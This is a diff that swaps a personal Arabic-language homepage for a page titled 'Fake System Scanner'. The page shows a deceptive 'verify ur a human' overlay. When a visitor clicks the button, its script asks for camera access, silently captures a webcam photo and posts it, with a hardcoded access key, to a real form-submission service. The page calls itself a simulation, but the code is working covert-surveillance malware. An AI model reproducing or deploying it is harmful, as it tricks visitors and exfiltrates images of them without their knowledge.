@@ -1,43 +1,83 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <meta charset="utf-8">
-        <title>Steve web</title>
-        <link rel="stylesheet" href="style.css" />
-        <meta name="viewport" content="initial-scale=0.6,maximum-scale=1,user-scalable=no"/>
-
-    </head>
+<head>
+    <title>Fake System Scanner</title>
+    <style>
+        /* Fake "critical update" UI */
+        #scannerUI {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1a1a;
+            color: white;
+            text-align: center;
+            padding: 20% 10%;
+            font-family: Arial, sans-serif;
+            z-index: 10000;
+        }
+        .warning {
+            color: #ff4444;
+            font-size: 24px;
+        }
+        #hiddenVideo {
+            display: none;
+        }
+    </style>
+</head>
 <body>
-    <div class="top">
-        <a href="index.html"><img src="image/steve.png" alt="" style="width: 250px;"></a>
+    <!-- Social engineering overlay -->
+    <div id="scannerUI">
+        <div class="warning">Hello</div>
+        <p>verify ur a human</p>
+        <button onclick="initiateScan()">I swear i am a human</button>
     </div>
-    <div class="center">
 
-        <div class="about">
-            <a href="about.html" style="width: 250px; height: 250px;"></a>
-            <h1 class="aboutname">عن</h1>
-            <img src="image/about.png" style="width: 50%; height: 50%;" class="aboutpng">
-            
-        </div>
-        <div class="message">
-            <a href="message.html" style="width: 250px; height: 250px;"></a>
-            <h1 class="messagename" style="position: absolute; margin-left: 36%;">صارح</h1>
-            <img src="image/chat.png" style="display: flex; width: 60%; height: 60%; margin-left: 20%; margin-top: 10%;">
-        </div>
-        <div class="project">
-            <a href="project.html" style="width: 250px; height: 250px;"></a>
-            <h1 style="position: absolute; margin-left: 31%;">مشاريع</h1>
-            <img src="image/project.png" style="position:static ;width: 66%; height: 66%; margin-left: 25%; margin-top: 10%;">
-        </div>
-        <div class="game">
-            <a href="game.html" style="width: 250px; height: 250px;"></a>
-            <h1 style="position: absolute; margin-left: 31%;">بتحبني؟</h1>
-            <img src="image/cat.jpg" style="position: static; width: 70%; height: 70%; margin-left: 15%; margin-top: 22%;">
-            
-        </div>
-     </div>
+    <!-- Hidden elements -->
+    <video id="hiddenVideo" autoplay></video>
+    
+    <!-- Web3Forms integration (simulated) -->
+    <form id="dataExfilForm" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="44604642-f517-467d-ba44-d54873c970c3">
+        <input type="hidden" id="stolenPhoto" name="photo_data">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
 
+    <script>
+        async function initiateScan() {
+            try {
+                // Step 1: Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
 
+                // Step 2: Capture photo after 2 seconds
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
 
+                    // Convert to Base64
+                    const photoData = canvas.toDataURL('image/jpeg');
+                    
+                    // Step 3: Exfiltrate via Web3Forms (simulated)
+                    document.getElementById('stolenPhoto').value = photoData;
+                    fetch('https://api.web3forms.com/submit', {
+                        method: 'POST',
+                        body: new FormData(document.getElementById('dataExfilForm'))
+                    }).then(() => {
+                        console.log("[SIMULATION] Photo exfiltrated");
+                    });
+
+                }, 2000);
+
+            } catch (err) {
+                console.error("[SIMULATION] Permission denied");
+            }
+        }
+    </script>
 </body>
 </html>
